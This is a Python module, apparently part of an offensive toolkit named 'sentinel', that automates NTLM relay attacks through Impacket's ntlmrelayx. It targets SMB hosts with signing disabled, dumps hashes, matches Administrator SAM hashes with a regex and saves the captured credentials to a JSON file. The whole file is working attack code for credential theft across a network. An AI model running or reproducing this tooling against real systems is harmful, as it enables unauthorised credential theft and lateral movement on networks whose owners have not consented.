#!/usr/bin/env python3
"""
relay.py — NTLM relay automation using Impacket's ntlmrelayx
Targets SMB signing-disabled hosts for credential relay and command execution
"""

import asyncio
import json
import logging
import re
import subprocess
from pathlib import Path
from typing import List

log = logging.getLogger("sentinel.relay")

SUCCESS_PATTERN = re.compile(r"\[\*\] (Authenticating|SMBD|Target)")
SHELL_PATTERN = re.compile(r"\[\*\] Opening interactive shell")
SAM_PATTERN = re.compile(r"Administrator:(\d+):(\S+):(\S+):::")


class RelayEngine:
    def __init__(self, targets: List[str], output_dir: Path):
        self.targets = targets
        self.output_dir = output_dir
        self.relayed_creds = []
        self.proc = None

    def _write_targets_file(self) -> Path:
        targets_file = self.output_dir / "relay_targets.txt"
        content = "\n".join(f"smb://{t}" for t in self.targets)
        targets_file.write_text(content)
        log.info(f"relay targets: {self.targets}")
        return targets_file

    async def start(self):
        targets_file = self._write_targets_file()
        log.info("starting NTLM relay")

        cmd = [
            "ntlmrelayx.py",
            "-tf", str(targets_file),
            "-smb2support",
            "--dump-lm",
            "-of", str(self.output_dir / "relayed")
        ]

        try:
            self.proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )

            async for line in self.proc.stdout:
                decoded = line.decode("utf-8", errors="replace").strip()
                log.debug(f"relay: {decoded}")

                if SUCCESS_PATTERN.search(decoded):
                    log.info(f"relay event: {decoded}")

                sam_match = SAM_PATTERN.search(decoded)
                if sam_match:
                    cred = {
                        "type": "SAM",
                        "hash": sam_match.group(0)
                    }
                    self.relayed_creds.append(cred)
                    log.info(f"SAM hash captured via relay")
                    self._save_creds(cred)

        except FileNotFoundError:
            log.error("ntlmrelayx.py not found — install: pip install impacket")
        except Exception as e:
            log.error(f"relay engine error: {e}")

    def _save_creds(self, cred: dict):
        creds_file = self.output_dir / "relayed_creds.json"
        existing = []
        if creds_file.exists():
            existing = json.loads(creds_file.read_text())
        existing.append(cred)
        creds_file.write_text(json.dumps(existing, indent=2))

    async def stop(self):
        if self.proc:
            self.proc.terminate()
            await self.proc.wait()
            log.info("relay engine stopped")
